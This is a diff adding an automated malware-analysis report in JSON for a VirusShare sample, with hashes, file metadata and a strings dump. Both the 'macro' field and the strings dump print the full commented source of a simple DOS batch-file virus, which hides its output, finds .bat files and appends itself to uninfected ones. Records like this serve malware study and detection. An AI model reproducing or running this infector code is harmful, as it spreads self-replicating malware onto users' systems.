@@ -1,0 +1,46 @@
+{
+    "docinfo": {
+        "attributes": [],
+        "behavior": {
+            "OUTPUT": "May write to a file"
+        },
+        "macro": "ctty nul._!\n: REM THIS TURNS OFF ALL SCREEN OUTPUT\nfor %%f in (*.bat ..\\*.bat) do set _!=%%f \n: REM FINDS A CANIDATE BAT FILE\nfind \"_!\"<<%_!%\n: REM THIS LINE CHECKS FOR ANY _! \nif errorlevel 1 find \"_!\"<%0.BAT>>%_!% \n: REM IF _! IS FOUND THEN SKIP THIS IF NOT THEN BY\n: REM FINDING ALL LINES WITH _! AND REDIRECTING THEM TO THE\n: REM NEW HOST WE INFECT THE BAT FILE WHILE NOT REINFECTING \nctty con._!\n:REM RETSTORES THE OUTPUT TO SCREEEN\n: REM SIMPLE BAT INFECTOR"
+    },
+    "filename": "VirusShare_3306a5cd684c8975c094b04edd0f9074",
+    "filesize": 477,
+    "filetype": "ASCII text, with CRLF line terminators",
+    "hashes": {
+        "md5": "3306a5cd684c8975c094b04edd0f9074",
+        "sha1": "4e300e572e77b0dfeeded5bfbcb570e8359955b0",
+        "sha256": "13fdd97f6e21ac40820d8df31a5c47f515344531c6c88e7d7da471575dbf78fa"
+    },
+    "peinfo": {},
+    "strings": {
+        "dump": [
+            "ctty nul._!",
+            ": REM THIS TURNS OFF ALL SCREEN OUTPUT",
+            "for %%f in (*.bat ..\\*.bat) do set _!=%%f ",
+            ": REM FINDS A CANIDATE BAT FILE",
+            "find \"_!\"<<%_!%",
+            ": REM THIS LINE CHECKS FOR ANY _! ",
+            "if errorlevel 1 find \"_!\"<%0.BAT>>%_!% ",
+            ": REM IF _! IS FOUND THEN SKIP THIS IF NOT THEN BY",
+            ": REM FINDING ALL LINES WITH _! AND REDIRECTING THEM TO THE",
+            ": REM NEW HOST WE INFECT THE BAT FILE WHILE NOT REINFECTING ",
+            "ctty con._!",
+            ":REM RETSTORES THE OUTPUT TO SCREEEN",
+            ": REM SIMPLE BAT INFECTOR"
+        ],
+        "file": {},
+        "fuzzing": {},
+        "ip": [],
+        "url": []
+    },
+    "time": "0:00:00.269954",
+    "version": "6.0.3",
+    "virustotal": {
+        "positives": "",
+        "total": ""
+    },
+    "yara_plugins": []
+}
